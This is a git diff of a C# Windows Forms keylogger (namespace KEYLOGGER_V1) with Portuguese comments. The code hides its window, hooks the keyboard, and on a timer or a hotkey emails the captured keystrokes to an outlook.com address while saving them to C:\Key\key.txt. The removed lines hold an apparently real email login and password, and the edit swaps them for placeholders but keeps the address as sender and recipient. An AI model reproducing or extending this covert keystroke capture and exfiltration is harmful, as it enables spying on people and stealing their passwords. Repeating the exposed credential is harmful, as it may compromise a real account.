@@ -1,7 +1,5 @@
-﻿//Programa teste 
+﻿
 using System;
-using System.IO;
-using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 
@@ -27,14 +25,14 @@ namespace KEYLOGGER_V1
         /// </summary>
         /// <param name="sender">Objeto</param>
         /// <param name="e">Definição do evento</param>
-        private void FrmHome_Load(object sender, EventArgs e)                  //EVENTO: Inicialização do formulário, para verificações Iniciais.
+        private void FrmHome_Load(object sender, EventArgs e) 
         {
             Hide(true);
             MetodosDeEventosHook();
 
             #region Gravação das informações
             Gravacao gravacao = new Gravacao();
-            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", "", "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
+            gravacao.Armazenar("Email", "Senha", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
             txtTextoDigitadoLimpo.Clear();
             #endregion
 
@@ -45,7 +43,7 @@ namespace KEYLOGGER_V1
         /// </summary>
         /// <param name="sender">Objeto</param>
         /// <param name="e">Definição do evento</param>
-        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
+        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
         {
             #region Gravação das informações
             Gravacao gravacao = new Gravacao();
@@ -61,7 +59,7 @@ namespace KEYLOGGER_V1
         /// </summary>
         /// <param name="sender">Objeto</param>
         /// <param name="e">Definição do evento</param>
-        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  //EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
+        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  
         {
             String AtalhoDeVisibilidade = "[Ctrl][Delete][Esc]"; // Deixa Invisivel ou visivel
             String AtalhoDeFechamento = "[Ctrl][Esc][Esc]";      // Fecha.
@@ -92,7 +90,7 @@ namespace KEYLOGGER_V1
                     if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeEnviarEmail) == AtalhoDeEnviarEmail)
                     {
                         Gravacao gravacao = new Gravacao();
-                        gravacao.Armazenar("login", "senha", "conteudo", "remtente", "destinatario", "assunto", "nomeArquivo", "DirLog");
+                        gravacao.Armazenar("Email", "Senha", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
                         txtTextoDigitadoLimpo.Clear();
                     }
                 }
@@ -107,11 +105,11 @@ namespace KEYLOGGER_V1
         /// </summary>
         /// <param name="sender">Objeto</param>
         /// <param name="e">Definição do evento</param>
-        private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
+        private void tmEnviarEmail_Tick(object sender, EventArgs e)          
         {
             #region Gravação das informações
             Gravacao gravacao = new Gravacao();
-            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
+            gravacao.Armazenar("Email", "Senha", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
             txtTextoDigitadoLimpo.Clear();
             #endregion
         }
